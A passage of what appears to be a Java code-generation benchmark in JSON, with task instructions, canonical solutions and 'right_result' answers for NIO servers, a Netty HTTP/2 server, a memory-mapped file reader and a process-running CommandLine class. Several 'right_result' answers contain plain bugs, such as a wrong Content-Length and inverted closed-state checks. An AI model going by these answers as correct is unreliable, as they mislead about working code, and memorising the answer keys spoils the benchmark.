                        buffer.flip();\n                                String request = new String(buffer.array(), 0, bytesRead);\n                                // Process request and prepare response\n                                String response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\";\n                                ByteBuffer responseBuffer = ByteBuffer.wrap(response.getBytes());\n                                clientChannel.register(clientWriteSelector, SelectionKey.OP_WRITE, responseBuffer);\n                            }\n                        }\n                        keyIterator.remove();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    static class ClientWriteChannelThread implements Runnable {\n        private final Selector clientReadSelector;\n        private final Selector clientWriteSelector;\n\n        public ClientWriteChannelThread(Selector clientReadSelector, Selector clientWriteSelector) {\n            this.clientReadSelector = clientReadSelector;\n            this.clientWriteSelector = clientWriteSelector;\n        }\n\n        @Override\n        public void run() {\n            while (true) {\n                try {\n                    clientWriteSelector.select();\n                    Iterator<SelectionKey> keyIterator = clientWriteSelector.selectedKeys().iterator();\n                    while (keyIterator.hasNext()) {\n                        SelectionKey key = keyIterator.next();\n                        if (key.isWritable()) {\n                            SocketChannel clientChannel = (SocketChannel) key.channel();\n                            ByteBuffer responseBuffer = (ByteBuffer) key.attachment();\n                            clientChannel.write(responseBuffer);\n                            if (!responseBuffer.hasRemaining()) {\n                                clientChannel.register(clientReadSelector, SelectionKey.OP_READ);\n                            }\n                        }\n                        keyIterator.remove();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            NioHttpServer server = new NioHttpServer(8080);\n            server.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 267,
    "Instruction": "Task Description: Implement a Java NIO HTTP server that handles multiple client connections asynchronously using non-blocking I/O operations.\n\nClass Description: NIOServer is a class that implements a non-blocking HTTP server using Java NIO (New I/O) components. It manages multiple client connections efficiently through a single thread using a Selector to monitor events on channels.\n\nAttributes:\n- serverSocketChannel: ServerSocketChannel - The main server channel that listens for incoming connections\n- selector: Selector - The multiplexor that monitors registered channels for I/O events\n\nMethods:\n- start(int port) -> void - Starts the server on the specified port, initializes the ServerSocketChannel and Selector, and begins the event loop\n- handleAccept(SelectionKey key) -> void - Handles new client connections by accepting the channel and registering it for read operations\n- handleRead(SelectionKey key) -> void - Handles incoming data from clients by reading from the channel and processing the request\n- handleWrite(SelectionKey key) -> void - Handles writing responses back to clients by preparing and sending data through the channel",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.nio.charset.Charset;\nimport java.util.Iterator;\nimport java.util.Set;\n\npublic class NIOServer {\n\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n\n    public void start(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        selector = Selector.open();\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        try {\n            while (true) {\n                if (selector.select(1) > 0) {\n                    Set<SelectionKey> set = selector.selectedKeys();\n                    Iterator<SelectionKey> keyIterator = set.iterator();\n\n                    while (keyIterator.hasNext()) {\n                        SelectionKey key = keyIterator.next();\n                        if (key.isAcceptable()) {\n                            handleAccept(key);\n                        } else if (key.isReadable()) {\n                            handleRead(key);\n                        } else if (key.isWritable()) {\n                            handleWrite(key);\n                        }\n                        keyIterator.remove();\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = ((ServerSocketChannel) key.channel()).accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        clientChannel.read(byteBuffer);\n        byteBuffer.flip();\n        System.out.println(Charset.defaultCharset().newDecoder().decode(byteBuffer).toString());\n        clientChannel.register(selector, SelectionKey.OP_WRITE);\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = ((SocketChannel) key.channel());\n        ByteBuffer byteBuffer = ByteBuffer.allocate(1024);\n        String msg = \"server channel write: current time mill\" + System.currentTimeMillis();\n        byteBuffer.put(msg.getBytes());\n        byteBuffer.flip();\n        clientChannel.write(byteBuffer);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 21,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\n\npublic class NIOServer {\n    private ServerSocketChannel serverSocketChannel;\n    private Selector selector;\n\n    public void start(int port) throws IOException {\n        serverSocketChannel = ServerSocketChannel.open();\n        serverSocketChannel.configureBlocking(false);\n        serverSocketChannel.socket().bind(new InetSocketAddress(port));\n        selector = Selector.open();\n        serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT);\n\n        while (true) {\n            selector.select();\n            Iterator<SelectionKey> keys = selector.selectedKeys().iterator();\n            while (keys.hasNext()) {\n                SelectionKey key = keys.next();\n                if (key.isAcceptable()) {\n                    handleAccept(key);\n                } else if (key.isReadable()) {\n                    handleRead(key);\n                } else if (key.isWritable()) {\n                    handleWrite(key);\n                }\n                keys.remove();\n            }\n        }\n    }\n\n    private void handleAccept(SelectionKey key) throws IOException {\n        ServerSocketChannel serverChannel = (ServerSocketChannel) key.channel();\n        SocketChannel clientChannel = serverChannel.accept();\n        clientChannel.configureBlocking(false);\n        clientChannel.register(selector, SelectionKey.OP_READ);\n    }\n\n    private void handleRead(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = ByteBuffer.allocate(1024);\n        int bytesRead = clientChannel.read(buffer);\n        if (bytesRead == -1) {\n            clientChannel.close();\n        } else if (bytesRead > 0) {\n            buffer.flip();\n            byte[] data = new byte[buffer.remaining()];\n            buffer.get(data);\n            String request = new String(data);\n            // Process the request and prepare response\n            String response = \"HTTP/1.1 200 OK\\r\\nContent-Length: 12\\r\\n\\r\\nHello, World!\";\n            ByteBuffer responseBuffer = ByteBuffer.wrap(response.getBytes());\n            clientChannel.register(selector, SelectionKey.OP_WRITE, responseBuffer);\n        }\n    }\n\n    private void handleWrite(SelectionKey key) throws IOException {\n        SocketChannel clientChannel = (SocketChannel) key.channel();\n        ByteBuffer buffer = (ByteBuffer) key.attachment();\n        clientChannel.write(buffer);\n        if (!buffer.hasRemaining()) {\n            clientChannel.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 268,
    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 server using Netty framework, supporting SSL/TLS encryption and providing methods for server startup and shutdown.\n\nClass Description: BaseHttp2Server is an abstract class that serves as a foundation for building HTTP/2 servers using Netty. It handles SSL/TLS configuration, channel management, and provides basic server lifecycle methods. Concrete implementations must define their own request handlers.\n\nAttributes:\n- sslContext: [SslContext] - SSL/TLS context for secure connections\n- hasReleasedSslContext: [AtomicBoolean] - Tracks whether SSL context resources have been released\n- bootstrap: [ServerBootstrap] - Netty server bootstrap configuration\n- shouldShutDownEventLoopGroup: [boolean] - Flag indicating whether to shutdown event loop group\n- allChannels: [ChannelGroup] - Tracks all active server channels\n\nMethods:\n- BaseHttp2Server([SslContext], [EventLoopGroup]) -> [void] - Constructor that initializes the server with SSL context and optional event loop group\n- addHandlersToPipeline([SSLSession], [ChannelPipeline]) -> [void] - Abstract method to be implemented by subclasses for adding custom handlers to the pipeline\n- start([int]) -> [CompletableFuture<Integer>] - Starts the server on specified port and returns future with bound port number\n- shutdown() -> [CompletableFuture<Void>] - Gracefully shuts down the server and releases resources",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.group.ChannelGroup;\nimport io.netty.channel.group.DefaultChannelGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.util.ReferenceCounted;\nimport io.netty.util.concurrent.Future;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport javax.net.ssl.SSLSession;\n\nabstract class BaseHttp2Server {\n    private final SslContext sslContext;\n    private final AtomicBoolean hasReleasedSslContext = new AtomicBoolean(false);\n    private final ServerBootstrap bootstrap;\n    private final boolean shouldShutDownEventLoopGroup;\n    private final ChannelGroup allChannels;\n\n    BaseHttp2Server(final SslContext sslContext, final EventLoopGroup eventLoopGroup) {\n        this.sslContext = sslContext;\n\n        if (this.sslContext instanceof ReferenceCounted) {\n            ((ReferenceCounted) this.sslContext).retain();\n        }\n\n        this.bootstrap = new ServerBootstrap();\n\n        if (eventLoopGroup != null) {\n            this.bootstrap.group(eventLoopGroup);\n            this.shouldShutDownEventLoopGroup = false;\n        } else {\n            this.bootstrap.group(new NioEventLoopGroup(1));\n            this.shouldShutDownEventLoopGroup = true;\n        }\n\n        this.allChannels = new DefaultChannelGroup(this.bootstrap.config().group().next());\n\n        this.bootstrap.channel(ServerChannelClassUtil.getServerSocketChannelClass(this.bootstrap.config().group()));\n        this.bootstrap.childHandler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            protected void initChannel(final SocketChannel channel) {\n                final SslHandler sslHandler = sslContext.newHandler(channel.alloc());\n                channel.pipeline().addLast(sslHandler);\n\n                sslHandler.handshakeFuture().addListener(handshakeFuture -> {\n                    if (handshakeFuture.isSuccess()) {\n                        BaseHttp2Server.this.addHandlersToPipeline(sslHandler.engine().getSession(), channel.pipeline());\n                        BaseHttp2Server.this.allChannels.add(channel);\n                    }\n                });\n            }\n        });\n    }\n\n    protected abstract void addHandlersToPipeline(final SSLSession sslSession, final ChannelPipeline pipeline) throws Exception;\n\n    public CompletableFuture<Integer> start(final int port) {\n        final ChannelFuture channelFuture = this.bootstrap.bind(port);\n        this.allChannels.add(channelFuture.channel());\n\n        final CompletableFuture<Integer> startFuture = new CompletableFuture<>();\n\n        channelFuture.addListener((future -> {\n            if (future.isSuccess()) {\n                startFuture.complete(((InetSocketAddress) channelFuture.channel().localAddress()).getPort());\n            } else {\n                startFuture.completeExceptionally(future.cause());\n            }\n        }));\n\n        return startFuture;\n    }\n\n    public CompletableFuture<Void> shutdown() {\n        final CompletableFuture<Void> shutdownFuture = new CompletableFuture<>();\n        final Future<Void> channelCloseFuture = this.allChannels.close();\n\n        if (this.shouldShutDownEventLoopGroup) {\n            channelCloseFuture.addListener(future ->\n                    BaseHttp2Server.this.bootstrap.config().group().shutdownGracefully());\n\n            this.bootstrap.config().group().terminationFuture().addListener(future -> {\n                if (future.isSuccess()) {\n                    shutdownFuture.complete(null);\n                } else {\n                    shutdownFuture.completeExceptionally(future.cause());\n                }\n            });\n        } else {\n            channelCloseFuture.addListener(future -> {\n                if (future.isSuccess()) {\n                    shutdownFuture.complete(null);\n                } else {\n                    shutdownFuture.completeExceptionally(future.cause());\n                }\n            });\n        }\n\n        return shutdownFuture.thenRun(() -> {\n            if (BaseHttp2Server.this.sslContext instanceof ReferenceCounted) {\n                if (BaseHttp2Server.this.hasReleasedSslContext.compareAndSet(false, true)) {\n                    ((ReferenceCounted) BaseHttp2Server.this.sslContext).release();\n                }\n            }\n        });\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 19,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.util.concurrent.Future;\n\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic abstract class BaseHttp2Server {\n    protected final SslContext sslContext;\n    protected final AtomicBoolean hasReleasedSslContext = new AtomicBoolean(false);\n    protected ServerBootstrap bootstrap;\n    protected boolean shouldShutDownEventLoopGroup;\n    protected ChannelGroup allChannels;\n\n    public BaseHttp2Server(SslContext sslContext) {\n        this(sslContext, null);\n    }\n\n    public BaseHttp2Server(SslContext sslContext, EventLoopGroup bossGroup, EventLoopGroup workerGroup) {\n        this.sslContext = sslContext;\n        if (bossGroup == null || workerGroup == null) {\n            bossGroup = new NioEventLoopGroup();\n            workerGroup = new NioEventLoopGroup();\n            shouldShutDownEventLoopGroup = true;\n        }\n        bootstrap = new ServerBootstrap()\n                .group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline p = ch.pipeline();\n                        p.addLast(sslContext.newHandler(ch.alloc()));\n                        p.addLast(new HttpServerCodec());\n                        p.addLast(new HttpObjectAggregator(65536));\n                        addHandlersToPipeline(null, p);\n                    }\n                });\n        allChannels = new DefaultChannelGroup(GlobalEventExecutor.INSTANCE);\n    }\n\n    protected abstract void addHandlersToPipeline(SSLSession session, ChannelPipeline pipeline);\n\n    public CompletableFuture<Integer> start(int port) {\n        return CompletableFuture.supplyAsync(() -> {\n            ChannelFuture f = bootstrap.bind(port).syncUninterruptibly();\n            allChannels.add(f.channel());\n            return f.channel().localAddress().getPort();\n        });\n    }\n\n    public CompletableFuture<Void> shutdown() {\n        if (shouldShutDownEventLoopGroup) {\n            return CompletableFuture.runAsync(() -> {\n                bootstrap.config().group().shutdownGracefully();\n                bootstrap.config().childGroup().shutdownGracefully();\n                allChannels.close().awaitUninterruptibly();\n                if (!hasReleasedSslContext.getAndSet(true)) {\n                    sslContext.shutdown();\n                }\n            });\n        } else {\n            return CompletableFuture.runAsync(() -> {\n                allChannels.close().awaitUninterruptibly();\n                if (!hasReleasedSslContext.getAndSet(true)) {\n                    sslContext.shutdown();\n                }\n            });\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 27,
    "Instruction": "Task Description: Implement a class for memory-mapped file reading with random access capabilities using Java NIO's FileChannel and MappedByteBuffer.\n\nClass Description: RandomAccessReadMemoryMappedFile is a class that provides random access reading functionality for files using memory-mapped I/O. It maps a file into memory for efficient reading operations and implements common random access operations like seek, read, and position tracking.\n\nAttributes:\n- mappedByteBuffer: ByteBuffer - The memory-mapped buffer containing the file contents\n- size: long - The size of the file in bytes\n- fileChannel: FileChannel - The file channel used for memory mapping\n- unmapper: Consumer<? super ByteBuffer> - A consumer for properly unmapping the buffer when closing\n\nMethods:\n- Constructor(filename: String) -> void - Creates an instance by opening the specified file\n- Constructor(file: File) -> void - Creates an instance using the specified File object\n- Constructor(path: Path) -> void - Creates an instance using the specified Path object\n- close() -> void - Closes the file channel and unmaps the buffer\n- seek(position: long) -> void - Sets the reading position in the file\n- getPosition() -> long - Returns the current reading position\n- read() -> int - Reads a single byte from the current position\n- read(b: byte[], offset: int, length: int) -> int - Reads bytes into an array\n- length() -> long - Returns the file size\n- isClosed() -> boolean - Checks if the reader is closed\n- isEOF() -> boolean - Checks if the current position is at end of file\n- checkClosed() -> void - Internal method to verify the reader isn't closed (throws IOException if closed)",
    "Canonical_solution": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.EnumSet;\nimport java.util.Optional;\nimport java.util.function.Consumer;\n\npublic class RandomAccessReadMemoryMappedFile implements RandomAccessRead\n{\n    private ByteBuffer mappedByteBuffer;\n    private final long size;\n    private final FileChannel fileChannel;\n    private final Consumer<? super ByteBuffer> unmapper;\n\n    public RandomAccessReadMemoryMappedFile(String filename) throws IOException\n    {\n        this(new File(filename));\n    }\n\n    public RandomAccessReadMemoryMappedFile(File file) throws IOException\n    {\n        this(file.toPath());\n    }\n\n    public RandomAccessReadMemoryMappedFile(Path path) throws IOException\n    {\n        fileChannel = FileChannel.open(path, EnumSet.of(StandardOpenOption.READ));\n        size = fileChannel.size();\n        if (size > Integer.MAX_VALUE)\n        {\n            throw new IOException(getClass().getName() + \" doesn't yet support files bigger than \"\n                    + Integer.MAX_VALUE);\n        }\n        mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, size);\n        unmapper = IOUtils::unmap;\n    }\n\n    @Override\n    public void close() throws IOException\n    {\n        if (fileChannel != null)\n        {\n            fileChannel.close();\n        }\n        if (mappedByteBuffer != null)\n        {\n            Optional.ofNullable(unmapper).ifPresent(u -> u.accept(mappedByteBuffer));\n            mappedByteBuffer = null;\n        }\n    }\n\n    @Override\n    public void seek(long position) throws IOException\n    {\n        checkClosed();\n        if (position < 0)\n        {\n            throw new IOException(\"Invalid position \"+position);\n        }\n        mappedByteBuffer.position((int) Math.min(position, size));\n    }\n\n    @Override\n    public long getPosition() throws IOException\n    {\n       checkClosed();\n       return mappedByteBuffer.position();\n    }\n\n    @Override\n    public int read() throws IOException\n    {\n        if (isEOF())\n        {\n            return -1;\n        }\n        return mappedByteBuffer.get() & 0xff;\n    }\n\n    @Override\n    public int read(byte[] b, int offset, int length) throws IOException\n    {\n        if (isEOF())\n        {\n            return -1;\n        }\n        int remainingBytes = (int)size - mappedByteBuffer.position();\n        remainingBytes = Math.min(remainingBytes, length);\n        mappedByteBuffer.get(b, offset, remainingBytes);\n        return remainingBytes;\n    }\n\n    @Override\n    public long length() throws IOException\n    {\n        checkClosed();\n        return size;\n    }\n\n    private void checkClosed() throws IOException\n    {\n        if (isClosed())\n        {\n            throw new IOException(getClass().getSimpleName() + \" already closed\");\n        }\n    }\n\n    @Override\n    public boolean isClosed()\n    {\n        return mappedByteBuffer == null;\n    }\n\n    @Override\n    public boolean isEOF() throws IOException\n    {\n        checkClosed();\n        return mappedByteBuffer.position() >= size;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "right_result": "```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.function.Consumer;\n\npublic class RandomAccessReadMemoryMappedFile {\n    private final ByteBuffer mappedByteBuffer;\n    private final long size;\n    private final FileChannel fileChannel;\n    private final Consumer<? super ByteBuffer> unmapper;\n\n    public RandomAccessReadMemoryMappedFile(String filename) throws IOException {\n        this(new File(filename));\n    }\n\n    public RandomAccessReadMemoryMappedFile(File file) throws IOException {\n        this(file.toPath());\n    }\n\n    public RandomAccessReadMemoryMappedFile(Path path) throws IOException {\n        fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n        size = fileChannel.size();\n        mappedByteBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, 0, size);\n        unmapper = bb -> {};\n    }\n\n    public void close() throws IOException {\n        unmapper.accept(mappedByteBuffer);\n        fileChannel.close();\n    }\n\n    public void seek(long position) throws IOException {\n        checkClosed();\n        if (position < 0 || position > size) {\n            throw new IllegalArgumentException(\"Position out of bounds\");\n        }\n        mappedByteBuffer.position((int) position);\n    }\n\n    public long getPosition() {\n        checkClosed();\n        return mappedByteBuffer.position();\n    }\n\n    public int read() throws IOException {\n        checkClosed();\n        if (isEOF()) {\n            return -1;\n        }\n        return mappedByteBuffer.get() & 0xFF;\n    }\n\n    public int read(byte[] b, int offset, int length) throws IOException {\n        checkClosed();\n        if (isEOF()) {\n            return -1;\n        }\n        return mappedByteBuffer.get(b, offset, length);\n    }\n\n    public long length() {\n        return size;\n    }\n\n    public boolean isClosed() {\n        return fileChannel.isOpen();\n    }\n\n    public boolean isEOF() {\n        return getPosition() == size;\n    }\n\n    private void checkClosed() throws IOException {\n        if (!isClosed()) {\n            throw new IOException(\"Reader is closed\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 270,
    "Instruction": "Task Description: Create a Java class that provides a fluent interface for building and executing command-line processes with configurable environment variables, working directory, and output handling.\n\nClass Description: The CommandLine class is a builder-style utility for executing external processes. It allows chaining configuration methods to set up command arguments, environment variables, working directory, and output streams before execution. The class handles process execution, stream management, and result collection.\n\nAttributes:\n- cmdLine: List<String> - Stores the command and its arguments\n- env: Map<String, String> - Stores environment variables for the process\n- cleanEnvironment: boolean - Flag to determine whether to clear existing environment variables\n- workingDirectory: File - The working directory for the process\n- outPrefix: String - Prefix for standard output lines\n- errPrefix: String - Prefix for error output lines\n- out: OutputStream - Stream for standard output\n- err: OutputStream - Stream for error output\n\nMethods:\n- cmd(String): CommandLine - Static factory method to create a new CommandLine instance with initial command\n- workingDirectory(File): CommandLine - Sets the working directory using File object\n- workingDirectory(String): CommandLine - Sets the working directory using path string\n- arg(String): CommandLine - Adds a single argument to the command\n- args(String...): CommandLine - Adds multiple arguments to the command\n- outPrefix(String): CommandLine - Sets prefix for standard output\n- errPrefix(String): CommandLine - Sets prefix for error output\n- out(OutputStream): CommandLine - Sets standard output stream\n- err(OutputStream): CommandLine - Sets error output stream\n- env(String, String): CommandLine - Adds an environment variable\n- newEnv(boolean): CommandLine - Configures whether to clean environment variables\n- run(): ProcessRunner.ProcessResult - Executes the configured command and returns the result",
    "Canonical_solution": "import jodd.io.StreamGobbler;\nimport java.io.ByteArrayOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.io.PrintStream;\nimport java.util.ArrayList;\nimport java.util.Collections;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class CommandLine {\n\n    public static final int OK = 0;\n\n    protected final List<String> cmdLine = new ArrayList<>();\n    protected Map<String, String> env = null;\n    protected boolean cleanEnvironment = false;\n    protected File workingDirectory;\n    protected String outPrefix;\n    protected String errPrefix;\n    protected OutputStream out = System.out;\n    protected OutputStream err = System.err;\n\n    protected CommandLine(final String command) {\n        cmdLine.add(command);\n    }\n\n    public static CommandLine cmd(final String command) {\n        return new CommandLine(command);\n    }\n\n    public CommandLine workingDirectory(final File workDirectory) {\n        this.workingDirectory = workDirectory;\n        return this;\n    }\n\n    public CommandLine workingDirectory(final String workDirectory) {\n        this.workingDirectory = new File(workDirectory);\n        return this;\n    }\n\n    public CommandLine arg(final String argument) {\n        cmdLine.add(argument);\n        return this;\n    }\n\n    public CommandLine args(final String... arguments) {\n        if (arguments != null && arguments.length > 0) {\n            Collections.addAll(cmdLine, arguments);\n        }\n        return this;\n    }\n\n    public CommandLine outPrefix(final String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(final String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(final OutputStream out) {\n        this.out = out;\n        return this;\n    }\n\n    public CommandLine err(final OutputStream err) {\n        this.err = err;\n        return this;\n    }\n\n    public CommandLine env(final String key, final String value) {\n        if (env == null) {\n            env = new HashMap<>();\n        }\n        env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(final boolean clean) {\n        cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        out = err = baos;\n\n        try {\n            baos.write(StringUtil.join(cmdLine, ' ').getBytes());\n            baos.write(StringPool.BYTES_NEW_LINE);\n        }\n        catch (IOException ignore) {\n        }\n\n        ProcessBuilder processBuilder = new ProcessBuilder();\n        processBuilder.command(cmdLine);\n\n        if (cleanEnvironment) {\n            processBuilder.environment().clear();\n        }\n        if (env != null) {\n            processBuilder.environment().putAll(env);\n        }\n\n        processBuilder.directory(workingDirectory);\n\n        Process process = null;\n        try {\n            process = processBuilder.start();\n        }\n        catch (IOException ioex) {\n            return writeException(baos, ioex);\n        }\n\n        StreamGobbler outputGobbler = new StreamGobbler(process.getInputStream(), out, outPrefix);\n        StreamGobbler errorGobbler = new StreamGobbler(process.getErrorStream(), err, errPrefix);\n\n        outputGobbler.start();\n        errorGobbler.start();\n\n        int result;\n        try {\n            result = process.waitFor();\n        }\n        catch (InterruptedException iex) {\n            return writeException(baos, iex);\n        }\n\n        outputGobbler.waitFor();\n        errorGobbler.waitFor();\n\n        return new ProcessRunner.ProcessResult(result, baos.toString());\n    }\n\n    private ProcessRunner.ProcessResult writeException(final ByteArrayOutputStream baos, final Exception ex) {\n        try {\n            baos.write(errPrefix.getBytes());\n        }\n        catch (IOException ignore) {\n        }\n\n        ex.printStackTrace(new PrintStream(baos));\n        return new ProcessRunner.ProcessResult(-1, baos.toString());\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 44,
    "right_result": "```java\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\n\npublic class CommandLine {\n    private List<String> cmdLine = new ArrayList<>();\n    private Map<String, String> env = new HashMap<>();\n    private boolean cleanEnvironment = false;\n    private File workingDirectory;\n    private String outPrefix = \"\";\n    private String errPrefix = \"\";\n    private OutputStream out = System.out;\n    private OutputStream err = System.err;\n\n    public static CommandLine cmd(String command) {\n        CommandLine cl = new CommandLine();\n        cl.cmdLine.add(command);\n        return cl;\n    }\n\n    public CommandLine workingDirectory(File dir) {\n        this.workingDirectory = dir;\n        return this;\n    }\n\n    public CommandLine workingDirectory(String path) {\n        this.workingDirectory = new File(path);\n        return this;\n    }\n\n    public CommandLine arg(String arg) {\n        cmdLine.add(arg);\n        return this;\n    }\n\n    public CommandLine args(String... args) {\n        for (String arg : args) {\n            cmdLine.add(arg);\n        }\n        return this;\n    }\n\n    public CommandLine outPrefix(String prefix) {\n        this.outPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine errPrefix(String prefix) {\n        this.errPrefix = prefix;\n        return this;\n    }\n\n    public CommandLine out(OutputStream os) {\n        this.out = os;\n        return this;\n    }\n\n    public CommandLine err(OutputStream os) {\n        this.err = os;\n        return this;\n    }\n\n    public CommandLine env(String key, String value) {\n        env.put(key, value);\n        return this;\n    }\n\n    public CommandLine newEnv(boolean clean) {\n        this.cleanEnvironment = clean;\n        return this;\n    }\n\n    public ProcessRunner.ProcessResult run() throws IOException, InterruptedException {\n        ProcessBuilder pb = new ProcessBuilder(cmdLine);\n        if (workingDirectory != null) {\n            pb.directory(workingDirectory);\n        }\n        if (cleanEnvironment) {\n            pb.environment().clear();\n        } else {\n            pb.environment().putAll(env);\n        }\n        Process process = pb.start();\n\n        StreamGobbler stdoutGobbler = new StreamGobbler(process.getInputStream(), out, outPrefix);\n        StreamGobbler stderrGobbler = new StreamGobbler(process.getErrorStream(), err, errPrefix);\n\n        stdoutGobbler.start();\n        stderrGobbler.start();\n\n        int exitCode = process.waitFor();\n        stdoutGobbler.join();\n        stderrGobbler.join();\n\n        return new ProcessRunner.ProcessResult(exitCode, stdoutGobbler.getOutput(), stderrGobbler.getError());\n    }\n\n    private static class StreamGobbler extends Thread {\n        private InputStream is;\n        private OutputStream os;\n        private String prefix;\n        private StringBuilder output = new StringBuilder();\n        private StringBuilder error = new StringBuilder();\n\n        public StreamGobbler(InputStream is, OutputStream os, String prefix) {\n            this.is = is;\n            this.os = os;\n            this.prefix = prefix;\n        }\n\n        @Override\n        public void run() {\n            try {\n                byte[] buffer = new byte[1024];\n                int len;\n                while ((len = is.read(buffer)) > 0) {\n                    String line = new String(buffer, 0, len);\n                    output.append(line);\n                    os.write((prefix + line).getBytes());\n                }\n            } catch (IOException e) {\n                error.append(e.getMessage());\n            }\n        }\n\n        public String getOutput() {\n            return output.toString();\n        }\n\n        public String getError() {\n            return error.toString();\n        }\n    }\n}\n\nclass ProcessRunner {\n    public static class ProcessResult {\n        private int exitCode;\n        private String output;\n        private String error;\n\n        public ProcessResult(int exitCode, String output, String error) {\n            this.exitCode = exitCode;\n            this.output = output;\n            this.error = error;\n        }\n\n        // Getters and other methods as needed\n    }\n}\n```"
  },
  {
    "Task_id": 271,
    "Instruction": "Task Description: Create a function that deobfuscates a Java stack trace by processing it through an external retrace tool, handling both success and failure cases appropriately.\n\nFunction Description: The function takes a Throwable object, converts its stack trace to a string, and attempts to deobfuscate it using an external retrace script (either .bat for Windows or .sh for other systems). The function handles temporary file creation for input, process execution, and output processing, with proper error handling and fallback to the original stack trace if deobfuscation fails.\n\nInput: \n- t: Throwable - The exception/throwable whose stack trace needs to be deobfuscated\n\nOutput: \n- String - The deobfuscated stack trace if successful, or the original stack trace if deobfuscation fails or isn't possible\n\nNote: The function relies on an environment variable XPIPE_MAPPING for the mapping file path and uses system-specific retrace scripts (retrace.bat or retrace.sh). It also includes a canDeobfuscate() check (implementation not shown) to determine if deobfuscation should be attempted.",
